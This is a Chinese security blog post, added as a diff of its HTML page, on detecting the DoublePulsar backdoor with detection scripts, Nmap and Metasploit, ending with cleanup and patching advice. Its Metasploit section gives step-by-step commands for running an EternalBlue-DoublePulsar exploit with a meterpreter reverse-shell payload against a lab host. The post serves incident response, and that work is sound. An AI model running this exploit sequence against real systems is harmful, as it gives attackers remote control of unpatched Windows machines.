@@ -1,0 +1,316 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Windows,DoublePulsar,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>DoublePulsar后门检测 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        DoublePulsar后门检测
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2021-03-27T08:00:32.000Z">
+        2021-03-27
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DoublePulsar/">DoublePulsar</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一般的，DoublePulsar后门会和Wannacry一块出没。而这就需要在做应急响应或者内网主机安全排查的时候来进行检测。</p>
+<h2 id="0x01-DoublePulsar后门检测"><a href="#0x01-DoublePulsar后门检测" class="headerlink" title="0x01 DoublePulsar后门检测"></a>0x01 DoublePulsar后门检测</h2><h3 id="DoublePulsar简介"><a href="#DoublePulsar简介" class="headerlink" title="DoublePulsar简介"></a>DoublePulsar简介</h3><p>DoublePulsar是由美国国家安全局（NSA）方程式组开发的后门植入工具，于2017年初由影子经纪人（The Shadow Brokers）泄露。该工具仅在几周内感染了超过200,000台Microsoft Windows计算机，并在2017年5月的WannaCry勒索软件攻击中与EternalBlue一起使用。</p>
+<p>DoublePulsar以内核模式运行， 属于Rootkit，这使网络犯罪分子能够对计算机系统进行高级别的控制。安装后，它使用三个命令：ping、kill和 exec、exec可用于将恶意软件加载到系统上。</p>
+<p>具体漏洞分析参考：<a href="https://www.freebuf.com/news/138725.html" target="_blank" rel="noopener">https://www.freebuf.com/news/138725.html</a></p>
+<h3 id="DoublePulsar后门检测方法"><a href="#DoublePulsar后门检测方法" class="headerlink" title="DoublePulsar后门检测方法"></a>DoublePulsar后门检测方法</h3><h4 id="GitHub检测脚本"><a href="#GitHub检测脚本" class="headerlink" title="GitHub检测脚本"></a>GitHub检测脚本</h4><p>项目地址：<a href="https://github.com/countercept/doublepulsar-detection-script" target="_blank" rel="noopener">https://github.com/countercept/doublepulsar-detection-script</a></p>
+<p>以Python2运行，分为SMB和RDP两个脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python detect_doublepulsar_smb.py --ip 192.168.175.128</span></span><br><span class="line">[-] [192.168.175.128] No presence of DOUBLEPULSAR SMB implant</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python detect_doublepulsar_smb.py --ip 192.168.175.128</span></span><br><span class="line">[+] [192.168.175.128] DOUBLEPULSAR SMB IMPLANT DETECTED!!!</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1</span></span><br><span class="line">[*] [192.168.175.141] Sending negotiation request</span><br><span class="line">[*] [192.168.175.141] Server explicitly refused SSL, reconnecting</span><br><span class="line">[*] [192.168.175.141] Sending non-ssl negotiation request</span><br><span class="line">[*] [192.168.175.141] Sending ping packet</span><br><span class="line">[-] [192.168.175.141] No presence of DOUBLEPULSAR RDP implant</span><br><span class="line">[*] [192.168.175.143] Sending negotiation request</span><br><span class="line">[*] [192.168.175.143] Server chose to use SSL - negotiating SSL connection</span><br><span class="line">[*] [192.168.175.143] Sending SSL client data</span><br><span class="line">[*] [192.168.175.143] Sending ping packet</span><br><span class="line">[-] [192.168.175.143] No presence of DOUBLEPULSAR RDP implant</span><br><span class="line">[*] [192.168.175.142] Sending negotiation request</span><br><span class="line">[*] [192.168.175.142] Sending client data</span><br><span class="line">[*] [192.168.175.142] Sending ping packet</span><br><span class="line">[+] [192.168.175.142] DOUBLEPULSAR RDP IMPLANT DETECTED!!!</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python2 detect_doublepulsar_smb.py --ip 192.168.175.136 --uninstall</span></span><br><span class="line">[+] [192.168.175.136] DOUBLEPULSAR SMB IMPLANT DETECTED!!! XOR Key: 0x7c3bf3c1</span><br><span class="line">[+] [192.168.175.136] DOUBLEPULSAR uninstall successful</span><br></pre></td></tr></table></figure>
+<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>参考：<a href="https://nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 445 &lt;target&gt; --script=smb-double-pulsar-backdoor</span><br></pre></td></tr></table></figure>
+<p>扫描输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">| smb-double-pulsar-backdoor:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Double Pulsar SMB Backdoor</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)</span><br><span class="line">|       The Double Pulsar SMB backdoor was detected running on the remote machine.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: 2017-04-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://isc.sans.edu/forums/diary/Detecting+SMB+Covert+Channel+Double+Pulsar/22312/</span><br><span class="line">|       https://github.com/countercept/doublepulsar-detection-script</span><br><span class="line">|_      https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation</span><br></pre></td></tr></table></figure>
+<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载对应的MSF插件并复制到目标目录中</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</span><br><span class="line"><span class="built_in">cd</span> Eternalblue-Doublepulsar-Metasploit/</span><br><span class="line">cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 --fix-missing</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建.wine/drive_c目录，否则后续利用漏洞时会出现目录不存在错误</span></span><br><span class="line">mkdir -p /root/.wine/drive_c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启MSF并重新加载插件</span></span><br><span class="line">msfconsole</span><br><span class="line">reload_all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞利用</span></span><br><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.200.142</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.200.130</span><br><span class="line"><span class="built_in">set</span> PROCESSINJECT explorer.exe <span class="comment"># 注意，需要设置PROCESSINJECT，使用默认值并没成功，改PROCESSINJECT为explorer.exe成功</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>如果扫描出来，可以应用前面的检测脚本清理掉：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 detect_doublepulsar_smb.py --ip 192.168.175.136 --uninstall</span><br></pre></td></tr></table></figure>
+<p>然后，安装补丁。</p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-DoublePulsar后门检测"><span class="toc-text">0x01 DoublePulsar后门检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DoublePulsar简介"><span class="toc-text">DoublePulsar简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DoublePulsar后门检测方法"><span class="toc-text">DoublePulsar后门检测方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GitHub检测脚本"><span class="toc-text">GitHub检测脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF"><span class="toc-text">MSF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2021/03/26/Windows-Shift后门利用/" rel="next" title="Windows Shift后门利用">
+          Windows Shift后门利用
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2021/03/29/自建DNSLog平台/" rel="prev" title="自建DNSLog平台">
+            自建DNSLog平台
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
